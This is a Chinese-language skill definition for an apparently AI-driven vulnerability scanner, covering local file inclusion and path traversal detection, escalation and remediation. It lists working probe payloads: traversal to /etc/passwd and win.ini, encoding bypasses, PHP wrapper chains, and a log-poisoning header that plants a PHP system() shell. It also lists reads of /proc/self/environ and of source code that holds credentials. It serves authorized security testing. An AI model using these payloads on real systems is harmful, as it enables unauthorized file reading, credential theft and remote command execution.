---
name: 'LFI 路径穿越与本地文件读取分析'
icon: '📁'
description: '当请求参数可能被服务端用来读本地文件系统时启用。典型信号：参数名含 file / path / dir / folder / template / name / page / include / src / doc / filename / url；Content-Type 为 application/octet-stream / text/html；URL 出现在文件预览 / 文档下载 / 模板渲染 / 日志查看 / 图片加载 / 静态资源代理 / include 引用 / 日志探针等场景。不适用：纯 API JSON（即便含 file 字段也只是元数据，不会读真实文件）、纯静态资源 CDN 回源。'
findingType: 'lfi'
---

本技能专注于本地文件包含 / 路径穿越 / 任意文件读取（LFI / Path Traversal / Arbitrary File Read）。在你识别到文件路径输入时，按以下流程处理：
1. 识别路径输入入口：query 参数（?file= / ?page= / ?template=）、body 字段、Referer / X-Forwarded-For / User-Agent（被日志记录后被运维工具渲染回显）、URL 路径段。
2. 推断拼接形态：字符串拼接（/var/www/static/ + userInput）、后缀追加（userInput + .html）、白名单前缀（必须以 /static/ 开头）。
3. 给出探测 payload（按操作系统分层）：
   - Linux 经典：../../../etc/passwd → 看响应里出现 root:x:0:0；
   - Linux 编码绕过：....//....//....//etc/passwd / ..%2f..%2f..%2fetc%2fpasswd / ..%252f..%252f..%252fetc%252fpasswd / ..%c0%af..%c0%af..%c0%afetc/passwd（UTF-8 编码绕过）；
   - Windows 经典：..\..\..\windows\win.ini → 看响应里出现 [fonts] / [extensions]；
   - 绝对路径：/etc/passwd / c:\windows\win.ini（绕过相对拼接）；
   - Null byte（PHP < 5.3.4）：../../../etc/passwd%00（截断后缀 .html）；
   - Wrapper 链（PHP）：php://filter/convert.base64-encode/resource=index.php（读 PHP 源码）/ php://input / data:// / expect:// / zip:// / phar://（phar 反序列化）；
   - 日志污染：先发带 ;<?php system($_GET[0]);?> 的请求到 User-Agent / Referer / X-Forwarded-For 头，再访问包含日志路径的入口触发（log poisoning）。
4. 给出修复建议：白名单文件 ID（数据库里查实际路径，不要让用户传路径）；canonicalize 后校验（realpath 后必须在白名单目录下）；禁用危险 wrapper（allow_url_include=Off / 禁用 php:// input）；后缀强制但用户输入不能含 ../；日志文件位置非默认（防 log poisoning）。
所有由本技能产出的 finding 必须设置 type=lfi。多个技能可能同时被激活，本技能不负责 SSRF（http:// 协议内网访问归 ssrf 技能，本技能专注 file:// 和本地路径）/ 文件上传（仅路径穿越用 filename 字段，本技能视角是 file/path 参数）/ 反序列化（phar:// 触发的反序列化归 deserialization 技能）等类型的发现。
【重放建议】LFI 3 次硬上限（orchestrator 管控）按：
- 第 1 次：先 ../../etc/passwd 探判活（看响应大小变化 / 是否出现 root:x）；
- 第 2 次：试编码绕过（..%2f / ....//）如果直接被拦，再试绝对路径 / wrapper（php://filter base64 读源码）；
- 第 3 次：精调 payload 拿更大文件（/proc/self/environ 看环境变量 / 数据库配置）。
判活后**优先** php://filter 读应用源码（base64 编码后服务端不解析，看到的 base64 解码可得 PHP 源码），找业务逻辑洞比单独 LFI 值钱。
看到 root:x:0:0:... 或 win.ini 段，给 high；看到 PHP 源码里有数据库配置 / 密钥给 critical。本技能是"分析建议"而非"硬性规则"，最终判断权交给模型。
- 【反误报】给 finding 设 confidence 时，只在能解释清楚"为什么 ≥ 60" 时给 ≥60；判不成立 / 仅残留小概率不确定性（如 5%–20%）的疑似不要写进 findings——本插件解析阶段会再过一道阈值（约 30）兜底，但 prompt 层的克制才是从源头减少问题列表噪声 finding 的关键。
